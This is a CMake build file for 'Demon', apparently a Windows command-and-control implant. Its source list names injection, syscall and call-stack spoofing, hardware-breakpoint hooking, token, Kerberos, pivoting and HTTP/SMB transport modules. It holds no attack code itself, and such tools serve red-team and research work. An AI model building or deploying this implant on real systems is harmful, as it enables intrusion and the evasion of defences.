cmake_minimum_required(VERSION 3.19)
project( Demon C ASM_NASM )

set( PROJECT_NAME Demon )

# set compiler settings
set( CMAKE_C_STANDARD 11 )
set( CMAKE_C_COMPILER x86_64-w64-mingw32-gcc )
set( CMAKE_C_FLAGS "-Wl,--pic-executable,-e,main -Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic " )

# set assembler settings for Windows
set( CMAKE_ASM_NASM_COMPILER nasm )
set( CMAKE_ASM_NASM_FLAGS "-f win64" )

# adding demon sources
include_directories( include )

set( COMMON_SOURCE
        src/core/Command.c
        src/core/Win32.c
        src/core/MiniStd.c
        src/core/Token.c
        src/core/Package.c
        src/core/Obf.c
        src/core/Spoof.c
        src/core/Syscalls.c
        src/core/SysNative.c
        src/core/Command.c
        src/core/Transport.c
        src/core/TransportHttp.c
        src/core/TransportSmb.c
        src/core/Parser.c
        src/core/Pivot.c
        src/core/Jobs.c
        src/core/Download.c
        src/core/Dotnet.c
        src/core/Socket.c
        src/core/Kerberos.c
        src/core/Thread.c
        src/core/Memory.c
        src/core/Runtime.c
        src/core/HwBpEngine.c
        src/core/HwBpExceptions.c
        src/core/CoffeeLdr.c
        src/core/ObjectApi.c
)

set( INJECT_SOURCE
        src/inject/Inject.c
        src/inject/InjectUtil.c
)

set( CRYPT_SOURCE
        src/crypt/AesCrypt.c
)

set( ASM_SOURCE
        src/asm/Syscall.x64.asm
        src/asm/Spoof.x64.asm
)

set( MAIN_SOURCE
        # Demon Main entrypoint
        src/Demon.c

        # windows exe (only include one main file for executable build)
        src/main/MainExe.c
)


# preprocessor flags
add_compile_definitions( DEBUG )

add_compile_definitions( CONFIG_BYTES={} )
add_compile_definitions( CONFIG_SIZE=1024 )
add_compile_definitions( CONFIG_KEY_BYTES={} )
add_compile_definitions( CONFIG_KEY_SIZE=16 )
add_compile_definitions( SERVICE_NAME="DemonService" )

add_compile_definitions( TRANSPORT_HTTP )
add_compile_definitions( TRANSPORT_SMB )
add_compile_definitions( AES256 )

# linking library
link_libraries( netapi32 ws2_32 wsock32 wtsapi32 iphlpapi winhttp advapi32 )

# add compiled demons
add_executable( ${PROJECT_NAME} ${COMMON_SOURCE} ${INJECT_SOURCE} ${EXT_SOURCE} ${CRYPT_SOURCE} ${LOADER_SOURCE} ${MAIN_SOURCE} ${ASM_SOURCE} )
